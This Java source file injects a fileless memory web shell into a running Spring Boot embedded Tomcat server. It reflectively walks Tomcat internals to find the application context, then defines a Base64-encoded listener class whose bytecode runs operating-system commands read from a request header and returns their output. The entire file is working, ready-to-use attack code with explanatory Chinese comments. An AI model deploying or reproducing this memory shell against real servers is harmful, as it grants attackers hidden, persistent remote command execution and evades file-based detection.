package com.example.tomcatmemshell.demos.web.spel;

import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;

public class AddListener2 {

    public static String LISTENER_CLASS_STRING = "yv66vgAAADQAmgoAHwBKCgBCAEsHAEwKAB8ATQgAPAoATgBPCgBDAFAKAEMAUQcAUggAPgsAAwBTCgBUAFUKAFQAVgoARQBXBwBYBwBZCgAQAFoKAA8AWwoACQBcCgBdAF4KAA8AXwoARwBgCgBHAGEIAGIKAGMAZAoAQwBlCgBFAGYHAGcKABwAaAcAaQcAagcAawEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQBDTGNvbS9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL2RlbW9zL3dlYi9hZGRMaXN0ZW5lci9NZW1zaGVsbExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAEdXNlRgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXF1ZXN0RgEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAANjbWQBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAbAcAbQcAbgcAbwcAcAcAcQEAClNvdXJjZUZpbGUBABVNZW1zaGVsbExpc3RlbmVyLmphdmEMACEAIgwAcgBzAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAdAB1BwB2DAB3AHgMAHkAegwAewB8AQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAwAfQB+BwB/DACAAIEMAIIAgwwAhACFAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMACEAhgwAIQCHDACIAIkHAIoMAIsAjAwAjQCODACPAJAMAJEAIgEAC3VzaW5nV3JpdGVyBwCSDACTAJQMAJUAlgwAlwCYAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAmQAiAQBBY29tL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvZGVtb3Mvd2ViL2FkZExpc3RlbmVyL01lbXNoZWxsTGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9QcmludFdyaXRlcgEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBABYoWilMamF2YS9sYW5nL0Jvb2xlYW47AQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAHd2FpdEZvcgEAAygpSQEAD3ByaW50U3RhY2tUcmFjZQAhAB4AHwABACAAAAADAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAAEAAlAAAADAABAAAABQAmACcAAAABACgAKQABACMAAAA1AAAAAgAAAAGxAAAAAgAkAAAABgABAAAAEwAlAAAAFgACAAAAAQAmACcAAAAAAAEAKgArAAEAAQAsACkAAQAjAAACCwAFAAwAAACpK7YAAsAAA00stgAEEgW2AAZOLQS2AActLLYACMAACToELBIKuQALAgA6BRkFxgBzuAAMGQW2AA06BhkGtgAOOge7AA9ZuwAQWRkHtwARtwASOggZBLYAE7YAFDoKGQi2ABVZOgnGAA0ZChkJtgAWp//uGQq2ABcZBLYAE7YABBIYtgAGOgsZCwS2AAcZCxkEtgATA7gAGbYAGhkGtgAbV6cACE0stgAdsQABAAAAoACjABwAAwAkAAAAVgAVAAAAFwAIABgAEgAaABcAGwAhAB0AKwAeADAAHwA6ACAAQQAhAFMAIwBdACQAaAAlAHIAJwB3ACgAhgApAIwAKgCaACsAoAAvAKMALQCkAC4AqAAwACUAAACEAA0AOgBmAC0ALgAGAEEAXwAvADAABwBTAE0AMQAyAAgAZQA7ADMANAAJAF0AQwA1ADYACgCGABoANwA4AAsACACYADkAOgACABIAjgA7ADgAAwAhAH8APAA9AAQAKwB1AD4ANAAFAKQABAA/AEAAAgAAAKkAJgAnAAAAAACpACoAKwABAEEAAABiAAX/AF0ACwcAHgcAQgcAAwcAQwcACQcARAcARQcARgcADwAHAEcAAP8AFAALBwAeBwBCBwADBwBDBwAJBwBEBwBFBwBGBwAPBwBEBwBHAAD/AC0AAgcAHgcAQgAAQgcAHAQAAQBIAAAAAgBJ";
    public AddListener2() {
        try {

            // 从线程中获取类加载器WebappClassLoaderBase
            TomcatEmbeddedWebappClassLoader contextClassLoader = (TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            WebResourceRoot resource = (WebResourceRoot) getField(contextClassLoader,Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources"));
            Context context=  resource.getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            // 从Application中获取StandardService对象
            StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));

            // 从StandardService中获取Connector数组
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector : connectors) {
                if (connector.getScheme().toLowerCase().contains("http")) {
                    // 获取Connector对象的protocolHandler属性值
                    ProtocolHandler protocolHandler = connector.getProtocolHandler();
                    // 筛选我们需要的Abstract
                    if (protocolHandler instanceof AbstractProtocol) {
                        // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                        // 反射获取该方法
                        Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                        getHandler.setAccessible(true);
                        AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                        // 从上面获取的handler中取出global属性值
                        RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                        // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                        ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                        // 遍历List中的元素
                        for (Object processor : processors) {
                            RequestInfo requestInfo = (RequestInfo) processor;
                            // 获取对应的Request对象
                            org.apache.coyote.Request reqs = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) reqs.getNote(1);





                            // 创建自定义 Servlet
                            Class<?> servletClass = getClass(LISTENER_CLASS_STRING);

                            StandardContext context2 = (StandardContext) request.getContext();
                            context2.addApplicationEventListener(servletClass.newInstance());


                        }
                    }
                }
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getField(Object obj, Field field) {
        try {
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {

        }
        return null;
    }

    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        byte[] bytes = Base64.getDecoder().decode(classCode);

        Method method = null;
        Class<?> clz = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }
}
